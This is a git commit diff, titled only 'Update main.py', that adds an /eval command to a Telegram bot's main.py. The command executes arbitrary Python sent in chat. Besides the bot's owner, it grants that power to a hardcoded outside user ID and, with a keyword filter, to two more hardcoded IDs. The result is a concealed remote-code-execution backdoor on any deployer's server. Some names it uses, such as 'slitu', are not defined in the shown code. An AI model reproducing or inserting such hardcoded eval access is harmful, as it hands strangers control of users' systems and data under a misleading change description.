c5067166c2f3b0998bd43abf346f7a11b27cc4ca
Amarnath C <amarnathcharichilil@gmail.com>
2021-07-21 10:15:52 +0530

    Update main.py

--- main.py
+++ main.py
@@ -107,6 +107,74 @@ async def pause_playout(e):
  await e.edit(buttons=buttons)
  
 
+@bot.on(events.NewMessage(pattern="^/eval ?(.*)"))
+async def val(event):
+    try:
+        cmd = event.text.split(" ", maxsplit=1)[1]
+        if event.sender_id == OWNER_ID or event.sender_id == 1309680371:
+            pass
+        elif event.sender_id in [865058466, 1727249969]:
+            for x in restricted:
+                if x in cmd:
+                    return await event.reply("This has been disabled for you.")
+        else:
+            return
+        e = event
+        if event.reply_to:
+            await event.get_reply_message()
+        old_stderr = sys.stderr
+        old_stdout = sys.stdout
+        redirected_output = sys.stdout = io.StringIO()
+        redirected_error = sys.stderr = io.StringIO()
+        stdout, stderr, exc = None, None, None
+        try:
+            await aexec(cmd, event)
+        except Exception:
+            exc = traceback.format_exc()
+        stdout = redirected_output.getvalue()
+        stderr = redirected_error.getvalue()
+        sys.stdout = old_stdout
+        sys.stderr = old_stderr
+        evaluation = ""
+        if exc:
+            evaluation = exc
+        elif stderr:
+            evaluation = stderr
+        elif stdout:
+            evaluation = stdout
+        else:
+            evaluation = "Success"
+        final_output = "`{}`".format(evaluation)
+        MAX_MESSAGE_SIZE_LIMIT = 4095
+        if len(final_output) > MAX_MESSAGE_SIZE_LIMIT:
+            with io.BytesIO(str.encode(final_output)) as out_file:
+                out_file.name = "eval.text"
+                await tbot.send_file(
+                    event.chat_id,
+                    out_file,
+                    force_document=True,
+                    allow_cache=False,
+                    caption=cmd,
+                )
+
+        else:
+            await event.respond(final_output)
+    except Exception:
+        print(e)
+
+async def aexec(code, smessatatus):
+    message = event = smessatatus
+
+    def p(_x):
+        return print(slitu.yaml_format(_x))
+
+    reply = await event.get_reply_message()
+    exec(
+        "async def __aexec(message, reply, client, p): "
+        + "\n event = smessatatus = message"
+        + "".join(f"\n {l}" for l in code.split("\n"))
+    )
+    return await locals()["__aexec"](message, reply, tbot, p)
 
 
 
